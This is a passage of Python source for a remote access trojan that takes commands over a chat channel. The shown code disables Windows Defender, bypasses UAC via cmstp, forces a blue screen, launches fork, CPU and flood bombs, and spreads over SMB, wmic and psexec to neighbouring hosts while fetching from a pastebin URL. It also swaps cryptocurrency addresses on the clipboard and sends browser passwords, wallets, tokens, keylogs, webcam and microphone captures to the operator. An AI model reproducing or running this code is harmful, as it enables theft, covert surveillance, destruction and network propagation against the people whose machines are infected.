        return '[-] Failed'
    except:return '[-] Error'
def _am():
    os.system('shutdown /s /t 10')
    return '[!] Shutting down'
def _an():
    os.system('shutdown /r /t 10')
    return '[!] Restarting'
def _ao():
    os.system('shutdown /l')
    return '[!] Logging off'
def _ap():
    try:
        ntdll=ctypes.windll.ntdll
        ntdll.RtlAdjustPrivilege(19,1,0,ctypes.byref(ctypes.c_int()))
        ntdll.NtRaiseHardError(0xC0000022,0,0,0,6,ctypes.byref(ctypes.c_int()))
    except:pass
    return '[!] BSOD attempted'
def _aq():
    try:ctypes.windll.user32.BlockInput(True)
    except:pass
    return '[+] Input blocked'
def _ar():
    try:ctypes.windll.user32.BlockInput(False)
    except:pass
    return '[+] Input unblocked'
def _as(t,m):
    try:ctypes.windll.user32.MessageBoxW(0,m,t,0)
    except:pass
    return '[+] Message shown'
def _at(k):
    try:keyboard.press_and_release(k)
    except:pyautogui.press(k)
    return f'[+] Pressed {k}'
def _au(x,y):
    try:pyautogui.click(x,y)
    except:pass
    return f'[+] Clicked ({x},{y})'
def _av(t):
    try:pyautogui.typewrite(t)
    except:pass
    return f'[+] Typed {len(t)} chars'
def _aw(v):
    try:
        dev=AudioUtilities.GetSpeakers()
        intf=dev.Activate(IAudioEndpointVolume._iid_,CLSCTX_ALL,None)
        vol=intf.QueryInterface(IAudioEndpointVolume)
        vol.SetMasterVolumeLevelScalar(v/100,None)
    except:pass
    return f'[+] Volume set to {v}%'
def _ax():
    try:
        r=subprocess.run(['tasklist'],capture_output=True,text=True)
        return r.stdout[:3000]
    except:return '[-] Failed'
def _ay():
    try:
        subprocess.run(['reg','add','HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender','/v','DisableAntiSpyware','/t','REG_DWORD','/d','1','/f'],capture_output=True)
        subprocess.run(['powershell','-Command','Set-MpPreference -DisableRealtimeMonitoring $true'],capture_output=True)
        return '[+] Defender disabled'
    except:return '[-] Failed'
def _az():
    try:
        with tempfile.NamedTemporaryFile(mode='w',suffix='.inf',delete=False) as f:
            f.write('[Version]\nSignature=$CHICAGO$\nAdvancedINF=2.5\n[DefaultInstall]\nRunPreSetupCommands=RunPreSetupCommands\n[RunPreSetupCommands]\n'+sys.executable+' '+os.path.abspath(sys.argv[0])+'\n')
            p=f.name
        subprocess.run(['cmstp','/au',p],capture_output=True)
        os.unlink(p)
        return '[+] UAC bypass attempted'
    except:return '[-] Failed'
def _ba():
    def _flood():
        while True:
            try:requests.get('http://1.1.1.1',timeout=1)
            except:pass
    threading.Thread(target=_flood,daemon=True).start()
    return '[+] DDoS started'
def _bb():
    def _bomb():
        while True:
            subprocess.Popen([sys.executable,'-c','import os; os.system("start cmd")'])
            time.sleep(0.1)
    threading.Thread(target=_bomb,daemon=True).start()
    return '[+] Fork bomb started'
def _bc():
    def _burn():
        while True:[i**i for i in range(10000)]
    for _ in range(os.cpu_count() or 4):
        threading.Thread(target=_burn,daemon=True).start()
    return '[+] CPU bomb started'
def _bd():
    try:
        os.remove(sys.argv[0])
        return '[+] Self destructed'
    except:return '[-] Failed'

def _be():
    ips=[]
    try:
        g=netifaces.gateways()
        d=g['default'][netifaces.AF_INET]
        gw=d[0]
        s='.'.join(gw.split('.')[:-1])+'.0/24'
        arp=ARP(pdst=s)
        eth=Ether(dst='ff:ff:ff:ff:ff:ff')
        pkt=eth/arp
        r=srp(pkt,timeout=3,verbose=0)[0]
        for _,rcv in r:ips.append(rcv.psrc)
    except:pass
    return ips
def _bf():
    global _s1
    if not _s1:return '[-] Lateral movement disabled'
    ips=_be()
    c=0
    for ip in ips:
        try:
            try:
                conn=SMBConnection(ip,ip)
                conn.login('','')
                conn.listPath('C$','')
                subprocess.run(['wmic','/node:',ip,'process','call','create',f'cmd.exe /c {sys.executable} -c "import urllib.request; urllib.request.urlopen(\\"https://pastebin.com/raw/usAq1P1X\\").read()"'],capture_output=True,timeout=5)
                c+=1
            except:pass
            try:
                subprocess.run(['psexec',f'\\\\{ip}','-s','-d',sys.executable,'-c','import urllib.request; urllib.request.urlopen("https://pastebin.com/raw/usAq1P1X").read()'],capture_output=True,timeout=10)
                c+=1
            except:pass
        except:pass
    return f'[+] Spread attempted to {c} hosts'

def _bg():
    def _mon():
        last=''
        while True:
            cur=pyperclip.paste()
            if cur!=last and _s2 and _s3:
                if re.match(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$',cur) or re.match(r'^0x[a-fA-F0-9]{40}$',cur) or re.match(r'^4[0-9AB][1-9A-HJ-NP-Za-km-z]{94}$',cur):
                    pyperclip.copy(_s3)
            last=cur
            time.sleep(0.5)
    threading.Thread(target=_mon,daemon=True).start()
    return '[+] Clipper monitoring started'
_bg()

_h._l(_h._ch["commands"],'[+] Agent online')
_kl=_ac()
_cwd=os.getcwd()
while True:
    try:
        msgs=_h._n()
        for m in msgs:
            if m['author']['id']==_h.u:continue
            c=m['content']
            if not c.startswith('.'):continue
            cmd=c[1:].strip()
            p=cmd.split(maxsplit=1)
            a=p[0].lower()
            arg=p[1] if len(p)>1 else ''
            if a=='help':
                _h._l(_h._ch["commands"],'''**Commands**
.shell <cmd> - Execute command
.ps - List processes
.kill <name> - Kill process
.cd <dir> - Change directory
.ls [path] - List directory
.cat <file> - Read file
.download <file> - Download file
.upload <url> <file> - Upload from URL
.exec <url> - Download and execute EXE
.screenshot - Take screenshot
.webcam - Capture webcam
.mic - Record microphone
.keylog start/stop/dump - Keylogger
.clipboard - Get clipboard
.sysinfo - System info
.passwords - Browser passwords
.wifi - WiFi passwords
.wallets - Crypto wallets
.tokens - Discord tokens
.files - Grab sensitive files
.sessions - Steam/Telegram sessions
.blockinput - Block input
.unblockinput - Unblock input
.msg <title> <text> - Message box
.press <key> - Press key
.click <x> <y> - Click mouse
.type <text> - Type text
.volume <0-100> - Set volume
.shutdown - Shutdown
.restart - Restart
.logoff - Log off
.selfdestruct - Delete itself
.disabledefender - Disable Defender
.uacbypass - UAC bypass
.stream start/stop/quality - Screen stream
.tree [path] - Directory tree
.litterbox <file> - Upload large file
.spread_on/off - Enable/disable lateral movement
.spread - Execute lateral movement
.clipper_on/off - Enable/disable crypto clipper
.setwallet <address> - Set replacement wallet''')
            elif a=='shell':_h._l(_h._ch["commands"],f'```{_ae(arg)[:1900]}```')
            elif a=='ps':_h._l(_h._ch["commands"],f'```{_ax()[:1900]}```')
            elif a=='kill':_h._l(_h._ch["commands"],_af(arg))
            elif a=='cd':_h._l(_h._ch["commands"],_ag(arg))
            elif a=='ls':_h._l(_h._ch["commands"],f'```{_ah(arg)[:1900]}```')
            elif a=='cat':_h._l(_h._ch["commands"],f'```{_ai(arg)[:1900]}```')
            elif a=='download':
                d=_aj(arg)
                if d:_h._m(d,os.path.basename(arg));_h._l(_h._ch["commands"],'[+] File sent')
                else:_h._l(_h._ch["commands"],'[-] File not found')
            elif a=='upload':
                sp=arg.split()
                if len(sp)<2:_h._l(_h._ch["commands"],'Usage: .upload <url> <filename>')
                else:_h._l(_h._ch["commands"],_ak(sp[0],sp[1]))
            elif a=='exec':
                if not arg:_h._l(_h._ch["commands"],'Usage: .exec <url>')
                else:_h._l(_h._ch["commands"],_al(arg))
            elif a=='screenshot':
                s=_u()
                if s:_h._m(s,'screenshot.png');_h._l(_h._ch["commands"],'[+] Screenshot sent')
                else:_h._l(_h._ch["commands"],'[-] Screenshot failed')
            elif a=='webcam':
                w=_v()
                if w:_h._m(w,'webcam.jpg');_h._l(_h._ch["commands"],'[+] Webcam sent')
                else:_h._l(_h._ch["commands"],'[-] Webcam failed')
            elif a=='mic':
                a2=_w()
                if a2:_h._m(a2,'audio.wav');_h._l(_h._ch["commands"],'[+] Audio sent')
                else:_h._l(_h._ch["commands"],'[-] Mic failed')
            elif a=='keylog':
                if arg=='start':_kl.start();_h._l(_h._ch["commands"],'[+] Keylogger started')
                elif arg=='stop':_kl.stop();_h._l(_h._ch["commands"],'[+] Keylogger stopped')
                elif arg=='dump':
                    d=_kl.dump()
                    if d:_h._m(d,'keylog.txt');_h._l(_h._ch["commands"],'[+] Keylog sent')
                    else:_h._l(_h._ch["commands"],'[-] No data')
                else:_h._l(_h._ch["commands"],'Usage: .keylog start/stop/dump')
            elif a=='clipboard':cb=_t();_h._l(_h._ch["commands"],f'Clipboard: {cb if cb else "(empty)"}')
            elif a=='sysinfo':_h._l(_h._ch["commands"],f'```{json.dumps(_r(),indent=2)[:1900]}```')
            elif a=='passwords':
                pwd=_o()
                _h._m(json.dumps(pwd,indent=2),'passwords.json')
                _h._l(_h._ch["commands"],'[+] Passwords sent')
            elif a=='wifi':
                w=_s()
                _h._m(json.dumps(w,indent=2),'wifi.json')
                _h._l(_h._ch["commands"],'[+] WiFi sent')
            elif a=='wallets':
                w=_p()
                _h._m(json.dumps(w,indent=2),'wallets.json')
                _h._l(_h._ch["commands"],'[+] Wallets sent')
            elif a=='tokens':
                t=_q()
                _h._m(json.dumps(t,indent=2),'tokens.json')
                _h._l(_h._ch["commands"],'[+] Tokens sent')
            elif a=='files':
                fz=_x()
                for nm,dt in fz:_h._m(dt,nm)
                _h._l(_h._ch["commands"],f'[+] Sent {len(fz)} files')
            elif a=='sessions':
                se=_y()
                se.update(_z())
                se.update(_aa())
                se.update(_ab())
                _h._m(json.dumps(se,indent=2),'sessions.json')
                _h._l(_h._ch["commands"],'[+] Sessions sent')
            elif a=='blockinput':_h._l(_h._ch["commands"],_aq())
            elif a=='unblockinput':_h._l(_h._ch["commands"],_ar())
            elif a=='msg':
                sp=arg.split(maxsplit=1)
                if len(sp)<2:_h._l(_h._ch["commands"],'Usage: .msg <title> <text>')
                else:_h._l(_h._ch["commands"],_as(sp[0],sp[1]))
            elif a=='press':_h._l(_h._ch["commands"],_at(arg))
            elif a=='click':
                try:
                    x,y=map(int,arg.split())
                    _h._l(_h._ch["commands"],_au(x,y))
                except:_h._l(_h._ch["commands"],'Usage: .click <x> <y>')
            elif a=='type':_h._l(_h._ch["commands"],_av(arg))
            elif a=='volume':
                try:
                    v=int(arg)
                    _h._l(_h._ch["commands"],_aw(v))
                except:_h._l(_h._ch["commands"],'Usage: .volume <0-100>')
            elif a=='shutdown':_h._l(_h._ch["commands"],_am())
            elif a=='restart':_h._l(_h._ch["commands"],_an())
            elif a=='logoff':_h._l(_h._ch["commands"],_ao())
            elif a=='selfdestruct':_h._l(_h._ch["commands"],_bd());sys.exit(0)
            elif a=='disabledefender':_h._l(_h._ch["commands"],_ay())
            elif a=='uacbypass':_h._l(_h._ch["commands"],_az())
            elif a=='stream':
                if arg=='start':
                    if '_st' not in dir():_st=_ad(_h);threading.Thread(target=_st.start,daemon=True).start();_h._l(_h._ch["commands"],'[+] Streaming started')
                    else:_h._l(_h._ch["commands"],'[!] Stream already running')
                elif arg=='stop':
                    if '_st' in dir():_st.stop();del _st;_h._l(_h._ch["commands"],'[+] Streaming stopped')
                    else:_h._l(_h._ch["commands"],'[-] No stream')
                elif arg.startswith('quality'):
                    try:
                        q=int(arg.split()[1])
                        if '_st' in dir():_st.q=min(100,max(1,q));_h._l(_h._ch["commands"],f'[+] Quality set to {_st.q}%')
                        else:_h._l(_h._ch["commands"],'[-] No stream')
                    except:_h._l(_h._ch["commands"],'Usage: .stream quality <1-100>')
                else:_h._l(_h._ch["commands"],'Usage: .stream start/stop/quality')
            elif a=='tree':
                p=arg if arg else os.path.expanduser('~')
                t=_bh(p,3)
                if t:_h._m(json.dumps(t,indent=2),'tree.json');_h._l(_h._ch["commands"],'[+] Tree sent')
                else:_h._l(_h._ch["commands"],'[-] Tree failed')
            elif a=='litterbox':
                if not arg:_h._l(_h._ch["commands"],'Usage: .litterbox <file>')
                else:
                    r=_bi(arg)
                    if isinstance(r,bytes):_h._m(r,os.path.basename(arg));_h._l(_h._ch["commands"],'[+] File sent directly')
                    elif isinstance(r,str):_h._l(_h._ch["commands"],f'[+] File uploaded: {r}')
                    else:_h._l(_h._ch["commands"],'[-] Failed')
            elif a=='spread_on':_s1=True;_h._l(_h._ch["commands"],'[+] Spread enabled')
            elif a=='spread_off':_s1=False;_h._l(_h._ch["commands"],'[+] Spread disabled')
            elif a=='spread':_h._l(_h._ch["commands"],_bf())
            elif a=='clipper_on':_s2=True;_h._l(_h._ch["commands"],'[+] Clipper enabled')
            elif a=='clipper_off':_s2=False;_h._l(_h._ch["commands"],'[+] Clipper disabled')
            elif a=='setwallet':
                if arg:_s3=arg;_h._l(_h._ch["commands"],f'[+] Wallet set to {arg}')
                else:_h._l(_h._ch["commands"],'Usage: .setwallet <address>')
            else:_h._l(_h._ch["commands"],f'Unknown: {a}')
        time.sleep(random.uniform(2,5))
    except:
        time.sleep(10)
